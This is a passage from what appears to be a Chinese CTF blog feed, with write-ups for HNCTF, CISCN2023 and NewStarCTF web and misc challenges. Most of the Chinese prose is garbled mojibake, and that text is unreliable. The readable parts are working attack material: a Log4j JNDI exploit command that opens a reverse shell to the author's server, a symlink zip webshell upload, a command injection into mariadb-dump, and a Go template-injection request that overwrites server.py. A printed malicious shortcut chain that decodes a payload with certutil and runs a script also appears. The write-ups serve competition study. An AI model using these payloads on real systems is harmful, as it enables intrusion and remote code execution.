class="code"><pre><span class="line">get --&gt; </span><br><span class="line">    </span><br><span class="line">hn=hn&amp;%E2%<span class="number">80</span>%AE%E2%<span class="number">81</span>%A6LAG%E2%<span class="number">81</span>%A9%E2%<span class="number">81</span>%A6ctf=%E2%<span class="number">80</span>%AE%E2%<span class="number">81</span>%A6%<span class="number">20</span>Flag!%E2%<span class="number">81</span>%A9%E2%<span class="number">81</span>%A6ctf</span><br></pre></td></tr></table></figure></li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php|\fl4g|\\$|&#x27;|\&quot;/i&quot;</span>,<span class="variable">$want</span>)Or <span class="title function_ invoke__">is_file</span>(<span class="variable">$want</span>))</span><br></pre></td></tr></table></figure><p>é€šé…ç¬¦ç»•è¿‡</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">post --&gt; want=f*</span><br></pre></td></tr></table></figure><h3 id="HNCTF-2022-WEEK3-logjjjjlogjjjj"><a href="#HNCTF-2022-WEEK3-logjjjjlogjjjj" class="headerlink" title="[HNCTF 2022 WEEK3]logjjjjlogjjjj"></a>[HNCTF 2022 WEEK3]logjjjjlogjjjj</h3><p>å¤ç°ï¼š<a href="https://blog.csdn.net/weixin_47179815/article/details/125654828">https://blog.csdn.net/weixin_47179815/article/details/125654828</a></p><p>æœ¬åœ°ç¯å¢ƒï¼šJDKç‰ˆæœ¬1.8</p><p>æ”»å‡»æµç¨‹</p><ul><li><p>æœåŠ¡å™¨è¿è¡Œæ”»å‡»è„šæœ¬ç”Ÿæˆpayload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c &#123;echo,base64(åå¼¹shell)&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -A æœåŠ¡å™¨ip</span><br></pre></td></tr></table></figure></li></ul><p><img src="/../images/image-20221101211620970-1686150252661.png" alt="image-20221101211620970"></p><ul><li><p>æœåŠ¡å™¨ç›‘å¬ç«¯å£</p></li><li><p>å‘é€payload</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">$&#123;jndi:xxx:<span class="comment">//xxxx/xxx&#125;</span></span><br><span class="line">å°†ä¸Šé¢ç”Ÿæˆçš„payloadæ”¾å…¥ï¼ˆä¼˜å…ˆJDKï¼‰</span><br></pre></td></tr></table></figure><p>URLç¼–ç åå‘é€è¯·æ±‚</p><p><img src="/../images/image-20221101211959222-1686150252662.png" alt="image-20221101211959222"></p></li></ul><p>æˆåŠŸè¿æ¥</p><img src="E:\typora img\image-20221101211512855.png" alt="image-20221101211512855" style="zoom:50%;" /><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="ç®€å•ç¼–ç "><a href="#ç®€å•ç¼–ç " class="headerlink" title="ç®€å•ç¼–ç "></a>ç®€å•ç¼–ç </h3><p>å›¾ç‰‡å°¾éƒ¨æœ‰ä¸€ä¸²urlç¼–ç åçš„å­—ç¬¦</p><p><img src="/../images/image-20221102000004428-1686150252663.png" alt="image-20221102000004428"></p><h3 id="HNCTF-2022-Week1-çº¿ä¸‹å•æ€å‡ºé¢˜äººï¼ˆOSINT"><a href="#HNCTF-2022-Week1-çº¿ä¸‹å•æ€å‡ºé¢˜äººï¼ˆOSINT" class="headerlink" title="[HNCTF 2022 Week1]çº¿ä¸‹å•æ€å‡ºé¢˜äººï¼ˆOSINT)"></a>[HNCTF 2022 Week1]çº¿ä¸‹å•æ€å‡ºé¢˜äººï¼ˆOSINT)</h3><p><img src="/../images/image-20221101232202282-1686150252663.png" alt="image-20221101232202282"></p><p>é¦–å…ˆä»Aå›¾ç‰‡ä¸­æå–å‡ºç»çº¬åº¦</p><p><img src="/../images/image-20221101232242899-1686150252663.png" alt="image-20221101232242899"></p><p>å› ä¸ºè¿™ä¸ªç»çº¬åº¦æ˜¯åº¦åˆ†ç§’çš„å½¢å¼ï¼Œéœ€è¦å…ˆè½¬æ¢ä¸ºåº¦æ•°å½¢å¼</p><p>æ ¼å¼è½¬æ¢ï¼š<a href="http://www.gzhatu.com/du2dfm.html">http://www.gzhatu.com/du2dfm.html</a></p><p>å®šä½ï¼š<a href="http://www.gzhatu.com/dingwei.html">http://www.gzhatu.com/dingwei.html</a></p><p><img src="/../images/image-20221101232434815-1686150252663.png" alt="image-20221101232434815"></p><p>Aå›¾ç‰‡ä¸­è¿˜æœ‰ä¸€ä¸ªæç¤º</p><p><img src="/../images/image-20221101232718045-1686150252663.png" alt="image-20221101232718045"></p><p>æ‰€ä»¥å¯ä»¥ç¡®å®šå®šä½æ˜¯æ­£ç¡®çš„ã€‚</p><p>ç„¶åæ ¹æ®ç¬¬äºŒå¼ å›¾ä¸­çš„æ²³æµå¯ä»¥çŸ¥é“æ˜¯å¾€å“ªæ¡è·¯èµ°çš„ã€‚</p><img src="E:\typora img\image-20221101232747393.png" alt="image-20221101232747393" style="zoom:67%;" /><p>ç”¨é«˜å¾·åœ°å›¾å®šä½å˜‰å…´ç”µä¿¡å¤§å¦ï¼Œå¾€é‚£æ¡è·¯æ‰¾ï¼Œæ‰¾åˆ°</p><img src="E:\typora img\image-20221101232627057.png" alt="image-20221101232627057" style="zoom:67%;" /><p>flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(md5(<span class="string">&#x27;å˜‰å…´å¸‚å—æ¹–åŒºç¦¾å…´åŒ—è·¯506å·äºšèŠ¬æ±€ç²¾å“é…’åº—&#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest())<span class="comment">#utf-8ç¼–ç </span></span><br></pre></td></tr></table></figure><p>SSCTF{f833a4d17d35ca5da40f087950293d04}</p><p>ä¹Ÿå¯ä»¥ç”¨exifå·¥å…·æŸ¥çœ‹</p><img src="E:\typora img\image-20221101234725942.png" alt="image-20221101234725942" style="zoom: 50%;" /><h3 id="HNCTF-2022-Week1-ä¸‰ç”Ÿä¸‰ä¸–"><a href="#HNCTF-2022-Week1-ä¸‰ç”Ÿä¸‰ä¸–" class="headerlink" title="[HNCTF 2022 Week1]ä¸‰ç”Ÿä¸‰ä¸–"></a>[HNCTF 2022 Week1]ä¸‰ç”Ÿä¸‰ä¸–</h3><p>å¼±å¯†ç çˆ†ç ´ï¼Œå›¾ç‰‡base64éšå†™å¾—åˆ°äºŒç»´ç ï¼Œæ‰«æåç”¨æ …æ å¯†ç è§£å¯†ï¼Œæ¯ç»„å­—æ•°ä¸º3.</p><h3 id="HNCTF-2022-Week1-silly-zip"><a href="#HNCTF-2022-Week1-silly-zip" class="headerlink" title="[HNCTF 2022 Week1]silly_zip"></a>[HNCTF 2022 Week1]silly_zip</h3><p>ä¼ªåŠ å¯†+IHDRä¿®æ”¹</p><h3 id="HNCTF-2022-Week1-piz-galf"><a href="#HNCTF-2022-Week1-piz-galf" class="headerlink" title="[HNCTF 2022 Week1]piz.galf"></a>[HNCTF 2022 Week1]piz.galf</h3><p>ä¸¤æ¬¡é€†åº</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f = <span class="built_in">open</span>(<span class="string">r&quot;C:\Users\khaz\Downloads\pmb.galf&quot;</span> , <span class="string">&#x27;rb&#x27;</span> ).read()</span><br><span class="line">f2 = <span class="built_in">open</span>(<span class="string">r&quot;C:\Users\khaz\Downloads\flag.bmp&quot;</span> , <span class="string">&quot;wb&quot;</span>)</span><br><span class="line">f2.write(f[ ::-<span class="number">1</span>])</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CISCN2023 åˆèµ›</title>
      <link href="/2023/05/31/CISCN2023%E5%88%9D%E8%B5%9B/"/>
      <url>/2023/05/31/CISCN2023%E5%88%9D%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="27æ—¥-unzip"><a href="#27æ—¥-unzip" class="headerlink" title="27æ—¥_unzip"></a><strong>27æ—¥_unzip</strong></h2><p>æ‰“å¼€ç½‘ç«™ï¼Œæ˜¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„åŠŸèƒ½ç‚¹ï¼Œé…åˆé¢˜ç›®çš„åå­—ï¼Œç›´æ¥ä¸Šä¼ ä¸€ä¸ªè½¯é“¾æ¥æ–‡ä»¶ï¼Œç„¶åå›æ˜¾</p><p><img src="/../images/image-20230528170519886-1686150302067.png" alt="image-20230528170519886"></p><p>å‘ç°åªèƒ½ä¸Šä¼ zipæ–‡ä»¶ï¼Œå¹¶ä¸”ä½¿ç”¨äº†<code>unzip</code>å‘½ä»¤æ¥è§£å‹ç¼©ä¸Šä¼ çš„å‹ç¼©åŒ…ï¼Œæ‰€ä»¥ä¸èƒ½ä½¿ç”¨è·¯å¾„ç©¿è¶Š</p><blockquote><p>å› ä¸º<code>unzip</code>é»˜è®¤ä¼šå¿½è§†æ–‡ä»¶åä¸­<code>../</code></p></blockquote><p><img src="/../images/image-20230528171026375-1686150302067.png" alt="image-20230528171026375"></p><p>ä½†æ˜¯å¯ä»¥é€šè¿‡è½¯é“¾æ¥è¾¾åˆ°è·¯å¾„ç©¿è¶Šçš„åŠŸèƒ½ã€‚</p><p>å…ˆåˆ›å»ºä¸€ä¸ªè½¯é“¾æ¥æŒ‡å‘ç½‘ç«™ç›®å½•ï¼Œå‹ç¼©ä¸º1.zip</p><blockquote><p>zipè¦åŠ ä¸Š-yå‚æ•°ï¼Œæ‰èƒ½ä¿å­˜è½¯é“¾æ¥</p></blockquote><p><img src="/../images/Snipaste_2023-05-28_15-44-03-1686150302068.png" alt="Snipaste_2023-05-28_15-44-03"></p><p>ç„¶åå†åˆ›å»ºä¸€ä¸ªä¸è½¯é“¾æ¥åŒåçš„ç›®å½•ï¼Œå¹¶åœ¨è¯¥ç›®å½•ä¸‹åˆ›å»ºæœ¨é©¬æ–‡ä»¶ï¼Œå°†è¯¥ç›®å½•å‹ç¼©ä¸º2.zip</p><p><img src="/../images/Snipaste_2023-05-28_15-43-44-1686150302068.png" alt="Snipaste_2023-05-28_15-43-44"></p><p>ç„¶åå…ˆä¸Šä¼ 1.zipï¼Œè§£å‹å¾—åˆ°è½¯é“¾æ¥<code>test</code>ï¼Œå†ä¸Šä¼ 2.zipï¼Œè§£å‹å¾—åˆ°testç›®å½•å’Œshell.phpï¼Œå› ä¸ºtestæŒ‡å‘&#x2F;var&#x2F;www&#x2F;html,æ‰€ä»¥shell.phpå®é™…ä¸Šæ˜¯è¢«è§£å‹åˆ°ç½‘ç«™ç›®å½•ä¸‹</p><p><img src="/../images/Snipaste_2023-05-28_15-45-01-1686150302068.png" alt="Snipaste_2023-05-28_15-45-01"></p><p><img src="/../images/Snipaste_2023-05-28_15-45-12-1686150302068.png" alt="Snipaste_2023-05-28_15-45-12"></p><p>æœ€åè®¿é—®ï¼Œæ‰§è¡Œ<code>cat /flag</code>å³å¯</p><p><img src="/../images/Snipaste_2023-05-28_15-45-38-1686150302068.png" alt="Snipaste_2023-05-28_15-45-38"></p><h2 id="dumpit"><a href="#dumpit" class="headerlink" title="dumpit"></a><strong>dumpit</strong></h2><p>è®¿é—®ç½‘ç«™çœ‹åˆ°</p><p><img src="/../images/image-20230528171725614-1686150302068.png" alt="image-20230528171725614"></p><p>å¯ä»¥dumpå’Œquery</p><p>ä¸€å¼€å§‹æ˜¯å¯¹ç€queryæ€¼çš„ï¼Œå› ä¸ºå¯¹dumpä¸ç†Ÿ</p><p><img src="/../images/image-20230528171909470-1686150302069.png" alt="image-20230528171909470"></p><p>æŠŠè¯­å¥æ‰“å°å‡ºæ¥äº†ï¼Œæ‰€ä»¥å¾ˆæ˜æ˜¾å¯ä»¥æ§åˆ¶table_2_queryè¿›è¡Œæ³¨å…¥ï¼Œç„¶åé¢˜ç›®æç¤ºäº†flagåœ¨&#x2F;flagï¼Œæ‰€ä»¥å…ˆå°è¯•å¯ä¸å¯ä»¥å†™æ–‡ä»¶getshellï¼Œå‘ç°ä¸è¡Œï¼ŒæŸ¥äº†ä¸€ä¸‹secure_file_privä¸ºNULLç¡®å®æ˜¯ä¸è¡Œçš„</p><p><img src="/../images/image-20230528172420662-1686150302069.png" alt="image-20230528172420662"></p><p>å°è¯•å †å æ³¨å…¥ï¼Œçœ‹ä¸€ä¸‹èƒ½ä¸èƒ½æ—¥å¿—getshellï¼Œå‘ç°ï¼›åå¼•å·éƒ½è¢«è¿‡æ»¤äº†</p><p><img src="/../images/image-20230528172554485-1686150302069.png" alt="image-20230528172554485"></p><p>æ‰€ä»¥queryè¿™æ¡è·¯å°±èµ°ä¸é€šäº†ã€‚</p><p>ç„¶åæ˜¯dumpï¼Œåœ¨ç½‘ä¸ŠæŸ¥åˆ°</p><p><img src="/../images/image-20230528172802761-1686150302069.png" alt="image-20230528172802761"></p><p><img src="/../images/image-20230528172816727-1686150302069.png" alt="image-20230528172816727"></p><p>çŸ¥é“äº†æ˜¯ä½¿ç”¨ç³»ç»Ÿå‘½ä»¤æ¥dumpï¼Œè¿™é‡Œå°±å­˜åœ¨å‘½ä»¤æ‰§è¡Œæ¼æ´</p><p><img src="/../images/image-20230528173216386-1686150302069.png" alt="image-20230528173216386"></p><p>å‚ç…§ç¬”è®°ï¼Œè¿™é‡Œåªç”¨0d%0aå¯ä»¥ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?db=ctf&amp;table_2_dump=%0d%0a cat index.php </span><br></pre></td></tr></table></figure><p>åœ¨hereä¸­å¯ä»¥çœ‹åˆ°æºç </p><p><img src="/../images/image-20230528173600848-1686150302069.png" alt="image-20230528173600848"></p><p>å…³é”®ç‚¹</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$black</span> = <span class="string">&#x27;;`*#^$&amp;|&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$dump</span>=<span class="string">&#x27;mariadb-dump &#x27;</span>.<span class="variable">$db</span>.<span class="string">&#x27; &#x27;</span>.<span class="variable">$t2d</span>.<span class="string">&#x27; &gt;./log/&#x27;</span>.<span class="variable">$randstr</span>.<span class="string">&#x27;.log&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$dump</span>);</span><br></pre></td></tr></table></figure><p>ç„¶åé¢˜ç›®ä¸æ˜¯è¯´äº†flagåœ¨&#x2F;flagï¼Œè¯»äº†ä¸€ä¸‹å‘ç°æ²¡ç”¨ï¼Œçœ‹äº†ä¸€ä¸‹æƒé™</p><p><img src="/../images/image-20230528173721850-1686150302069.png" alt="image-20230528173721850"></p><p>å¼€å§‹æƒ³ç€å†™ä¸ªğŸï¼Œä¸Šå»ææƒè¯•è¯•ï¼Œçœ‹äº†ä¸‹ç›®å½•æƒé™ï¼Œåå¼¹shellä¹Ÿå¤±è´¥äº†ï¼ˆéº»äº†ğŸ˜…ï¼‰</p><p><img src="/../images/image-20230528173754533-1686150302069.png" alt="image-20230528173754533"></p><p>åé¢æƒ³åˆ°å¯èƒ½è¢«éª—äº†ï¼Œåœ¨ç¯å¢ƒå˜é‡ä¸­æ‰¾åˆ°äº†flag</p><p><img src="/../images/Snipaste_2023-05-28_15-35-41-1686150302069.png" alt="Snipaste_2023-05-28_15-35-41"></p><h2 id="go-sessionâ€“å¤ç°"><a href="#go-sessionâ€“å¤ç°" class="headerlink" title="go_sessionâ€“å¤ç°"></a>go_sessionâ€“å¤ç°</h2><p>æœ¬åœ°ä¼ªé€ session</p><p><img src="/../images/image-20230608095627395.png" alt="image-20230608095627395"></p><p><img src="/../images/image-20230608095722517.png" alt="image-20230608095722517"></p><p>æµ‹è¯•ä¸€ä¸‹ï¼Œå‘ç°ä¼ªé€ æˆåŠŸäº†</p><p><img src="/../images/image-20230608095852646.png" alt="image-20230608095852646"></p><p><img src="/../images/image-20230608095436931.png" alt="image-20230608095436931"></p><p>django</p><p><img src="/../images/image-20230608104903856.png" alt="image-20230608104903856"></p><p>go</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">func (c *Context) SaveUploadedFile(file *multipart.FileHeader, dst string) error</span><br></pre></td></tr></table></figure><p>SaveUploadedFileä¸Šä¼ è¡¨å•æ–‡ä»¶åˆ°æŒ‡å®šçš„dst</p><p>ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºè¡¨å•nameï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºè¦ä¿å­˜çš„ä½ç½®</p><p>è¯»å–æºç </p><p>payload</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">/admin?name=&#123;%25include+c.Request.Referer()%25&#125;</span><br><span class="line"></span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>/app/server.py</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230608100900686.png" alt="image-20230608100900686"></p><p>å‘ç°å®ƒæ˜¯debugæ¨¡å¼çš„ï¼Œ<strong>çƒ­éƒ¨ç½²ï¼ˆå°±æ˜¯æ¯æ¬¡ä¿®æ”¹ä¹‹åä¼šé‡æ–°ç¼–è¯‘è¿è¡Œä¸€æ¬¡ï¼‰</strong></p><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥è¿›è¡Œè¦†ç›–</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">GET /admin?name=&#123;&#123;c.SaveUploadedFile(c.FormFile(c.ClientIP()),c.Query(c.ClientIP()))&#125;&#125;&amp;<span class="number">118.117</span><span class="number">.49</span><span class="number">.52</span>=/app/server.py HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">124.220</span><span class="number">.192</span><span class="number">.120</span>:<span class="number">8888</span></span><br><span class="line">Content-<span class="type">Type</span>: multipart/form-data; boundary=----WebKitFormBoundary7IWRoUoGnVmsx4c3</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">114.0</span><span class="number">.0</span><span class="number">.0</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="number">0.8</span>,application/signed-exchange;v=b3;q=<span class="number">0.7</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh,zh-CN;q=<span class="number">0.9</span></span><br><span class="line">Cookie: session-name=MTY4NTE3NzM2NnxEdi1CQkFFQ180SUFBUkFCRUFBQUlfLUNBQUVHYzNSeWFXNW5EQVlBQkc1aGJXVUdjM1J5YVc1bkRBY0FCV0ZrYldsdXxY2f3GZVJmQsLELqlORmAjQMLNbC9ZF0rs_HfZqjIRlw==</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: <span class="number">488</span></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary7IWRoUoGnVmsx4c3</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;118.117.49.52&quot;</span>; filename=<span class="string">&quot;server.py&quot;</span></span><br><span class="line">Content-<span class="type">Type</span>: text/x-python</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    result = subprocess.run([<span class="string">&#x27;cat&#x27;</span>, <span class="string">&#x27;/flag&#x27;</span>], stdout=subprocess.PIPE)</span><br><span class="line">    <span class="keyword">return</span> result.stdout.decode()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__== <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;127.0.0.1&quot;</span>,port=<span class="number">5000</span>,debug=<span class="literal">True</span>)</span><br><span class="line">------WebKitFormBoundary7IWRoUoGnVmsx4c3--</span><br></pre></td></tr></table></figure><p>è¦†ç›–å®Œåï¼Œè®¿é—®<code>/flask?name=</code>ï¼ŒæˆåŠŸè¯»å–åˆ°äº†&#x2F;flag</p><p><img src="/../images/image-20230608102742110.png" alt="image-20230608102742110"></p><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="pyshell"><a href="#pyshell" class="headerlink" title="pyshell"></a><strong>pyshell</strong></h2><p>ä¸€çœ¼pythonæ²™ç›’é€ƒé€¸</p><p>ç®€å•æµ‹è¯•ä¸€ä¸‹</p><p><img src="/../images/image-20230528175915350-1686150302070.png" alt="image-20230528175915350"></p><p><img src="/../images/image-20230528180007692-1686150302070.png" alt="image-20230528180007692"></p><p>ç»•ä¸€ä¸‹<code>__import__</code>å’Œ<code>system</code></p><p><img src="/../images/image-20230528175941443-1686150302070.png" alt="image-20230528175941443"></p><p>å¯ä»¥ç”¨+æ‹¼æ¥ç»•è¿‡ï¼Œæœ€åç”¨_ç‰¹æ€§å’Œevalå‡½æ•°æ‰§è¡Œå­—ç¬¦ä¸²å³å¯</p><p><img src="/../images/image-20230528180159183-1686150302070.png" alt="image-20230528180159183"></p><p>æœ€åçš„payload</p><p><img src="/../images/image-20230528165834909-1686150302070.png" alt="image-20230528165834909"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>NewStarCTF</title>
      <link href="/2023/05/31/NewstarCTF/"/>
      <url>/2023/05/31/NewstarCTF/</url>
      
        <content type="html"><![CDATA[<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="week5"><a href="#week5" class="headerlink" title="week5"></a>week5</h2><h3 id="æœ€åçš„æµé‡åˆ†æ"><a href="#æœ€åçš„æµé‡åˆ†æ" class="headerlink" title="æœ€åçš„æµé‡åˆ†æ"></a>æœ€åçš„æµé‡åˆ†æ</h3><p>å…ˆæŒ‰ç…§æ•°æ®åŒ…å¤§å°æ’åˆ—ï¼Œçœ‹äº†å‡ ä¸ªåŒ…å‘ç°æ˜¯sqlå¸ƒå°”ç›²æ³¨ï¼ˆä¸Šå‘¨çš„sqlæˆ‘ç”¨çš„å°±æ˜¯å¸ƒå°”ç›²æ³¨ï¼‰ã€‚</p><p><img src="/../images/image-20221020130300434-1686150281425.png" alt="image-20221020130300434"></p><p>ä¸Šå›¾ä¸ºæ­£ç¡®å›æ˜¾</p><p>è¿›è¡Œè¿‡æ»¤</p><p><img src="/../images/image-20221020130340038-1686150281425.png" alt="image-20221020130340038"></p><p>ä¸€ä¸ªä¸€ä¸ªæ‰¾å°±è¡Œäº†</p><h3 id="å¥‡æ€ªçš„PDF-2"><a href="#å¥‡æ€ªçš„PDF-2" class="headerlink" title="å¥‡æ€ªçš„PDF 2"></a>å¥‡æ€ªçš„PDF 2</h3><p>ä¸‹è½½ä¸‹æ¥æ˜¯ä¸€ä¸ªå¿«æ·æ–¹å¼ï¼Œæ‰“å¼€æ˜¯ã€Šæ¬ºéª—çš„è‰ºæœ¯ã€‹è¿™æœ¬ä¹¦ã€‚ğŸ˜±</p><p>å®ƒæ˜¯å¿«æ·æ–¹å¼ï¼Œå¾ˆè‡ªç„¶å°±å»çœ‹å®ƒæŒ‡å‘äº†å“ªä¸ªæ–‡ä»¶</p><p><img src="/../images/image-20221020130709420-1686150281425.png" alt="image-20221020130709420"></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">%</span><span class="language-bash">SystemRoot%\system32\cmd.exe /c copy <span class="string">&quot;strange2.pdf.lnk&quot;</span> %tmp%\\g5ZokyumBB2gDn.tmp /y</span></span><br><span class="line"></span><br><span class="line">for /r C:\\Windows\\System32\\ %i in (*ertu*.exe) do copy %i %tmp%\\msoia.exe /y</span><br><span class="line"></span><br><span class="line">findstr.exe&quot;TVNDRgAAAA&quot;%tmp%\\g5ZokyumBB2gDn.tmp&gt;%tmp%\\cSi1r0uywDNvDu.tmp&amp;%tmp%\\msoia.ex</span><br></pre></td></tr></table></figure><p>ç„¶åæœç´¢msoia.exeå°±å¾—åˆ°äº†ç±»ä¼¼çš„é¢˜</p><p><a href="https://www.anquanke.com/post/id/267031">https://www.anquanke.com/post/id/267031</a></p><p><a href="https://www.cnblogs.com/hed10ne/p/15841253.html">https://www.cnblogs.com/hed10ne/p/15841253.html</a></p><blockquote><p>ç›®æ ‡çš„æœ€å¤§é•¿åº¦åªæœ‰260ä¸ªå­—ç¬¦ï¼Œè€Œå‘½ä»¤è¡Œå‚æ•°çš„æœ€å¤§é•¿åº¦æ˜¯4096ä¸ªå­—ç¬¦</p></blockquote><p>è¯»å–å®Œæ•´å‘½ä»¤</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> win32com.client <span class="comment"># pip install pywin32</span></span><br><span class="line"></span><br><span class="line">shell = win32com.client.Dispatch(<span class="string">&quot;WScript.Shell&quot;</span>)</span><br><span class="line">shortcut = shell.CreateShortCut(<span class="string">&quot;20200308-sitrep-48-covid-19.pdf.lnk&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(shortcut.Targetpath)</span><br><span class="line"><span class="built_in">print</span>(shortcut.Arguments)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">PS D:\python3<span class="number">.8</span>\code&gt; python -u <span class="string">&quot;d:\python3.8\code\0.py&quot;</span></span><br><span class="line">C:\Windows\System32\cmd.exe</span><br><span class="line">/c copy <span class="string">&quot;strange2.pdf.lnk&quot;</span> %tmp%\\g5ZokyumBB2gDn.tmp /y&amp;<span class="keyword">for</span> /r C:\\Windows\\System32\\ %i <span class="keyword">in</span> (*ertu*.exe) do copy %i %tmp%\\msoia.exe /y&amp;findstr.exe <span class="string">&quot;TVNDRgAAAA&quot;</span> %tmp%\\g5ZokyumBB2gDn.tmp&gt;%tmp%\\cSi1r0uywDNvDu.tmp&amp;%tmp%\\msoia.exe -decode %tmp%\\cSi1r0uywDNvDu.tmp %tmp%\\oGhPGUDC03tURV.tmp&amp;expand %tmp%\\oGhPGUDC03tURV.tmp -F:* %tmp% &amp;wscript %tmp%\\9sOXN6Ltf0afe7.js</span><br></pre></td></tr></table></figure><p><code>oGhPGUDC03tURV.tmp</code>çš„æ–‡ä»¶å¤´æ˜¯MSCFï¼Œæ˜¯å¾®è½¯çš„.cabå‹ç¼©æ–‡ä»¶æ ¼å¼</p><p><img src="/../images/image-20221020131408248-1686150281425.png" alt="image-20221020131408248"></p><p>ä½¿ç”¨å‘½ä»¤<code>expand %tmp%\\oGhPGUDC03tURV.tmp -F:* è§£å‹è·¯å¾„</code>å¾—åˆ°</p><p><img src="/../images/image-20221020131537014-1686150281425.png" alt="image-20221020131537014"></p><p>flagåœ¨flag.txtä¸­</p><p>jsè„šæœ¬</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> e7926b8de13327f8e703624e = <span class="keyword">new</span> <span class="title class_">ActiveXObject</span>(<span class="string">&quot;WScript.Shell&quot;</span>);e7926b8de13327f8e703624e.<span class="property">Run</span> (<span class="string">&quot;cmd /c mkdir %tmp%\\flag&amp;&amp;move /Y %tmp%\\cSi1r0uywDNvDu.tmp %tmp%\\flag\\flag.txt&amp;\&quot;%tmp%\\strange2.pdf\&quot;&quot;</span>,<span class="number">0</span>);</span><br></pre></td></tr></table></figure><h3 id="Yesec-no-drumsticks-5"><a href="#Yesec-no-drumsticks-5" class="headerlink" title="Yesec no drumsticks 5"></a>Yesec no drumsticks 5</h3><h4 id="gitå·¥ä½œåŸç†"><a href="#gitå·¥ä½œåŸç†" class="headerlink" title="gitå·¥ä½œåŸç†"></a>gitå·¥ä½œåŸç†</h4><img src="E:\typora img\git-command.jpg" alt="img" style="zoom:150%;" /><ul><li>workspaceï¼šå·¥ä½œåŒºâ€“æœ¬åœ°ç›®å½•ï¼ˆæ¯”å¦‚æˆ‘<code>git init Test</code>åˆ›å»ºäº†ä¸€ä¸ªç©ºä»“åº“ï¼Œé‚£ä¹ˆ<code>Test</code>è¿™ä¸ªç›®å½•å°±æ˜¯workspaceï¼‰</li><li>staging areaï¼šæš‚å­˜åŒº&#x2F;ç¼“å­˜åŒºâ€“.gitç›®å½•ä¸‹çš„indexæ–‡ä»¶ï¼ˆ<code>git add</code> æˆ–è€…<code>git stash</code>ï¼‰</li><li>local repositoryï¼šç‰ˆæœ¬åº“æˆ–æœ¬åœ°ä»“åº“â€“.gitç›®å½•ä¸‹çš„objectsç›®å½•</li><li>remote repositoryï¼šè¿œç¨‹ä»“åº“â€“github</li></ul><p>ä»¥æœ¬é¢˜ä¸ºä¾‹ï¼Œå…¶<code>.git</code>ç›®å½•å¦‚ä¸‹</p><p><img src="/../images/image-20221020162618015-1686150281425.png" alt="image-20221020162618015"></p><h4 id="è§£é¢˜"><a href="#è§£é¢˜" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h4><p><img src="/../images/image-20221020163752820-1686150281425.png" alt="image-20221020163752820"></p><p>indexä¸­æœ‰flag.txtæ–‡ä»¶</p><p>æ¢å¤ç¼“å­˜å·¥ä½œåŒº<code>git stash pop</code></p><p><img src="/../images/image-20221020163917173-1686150281426.png" 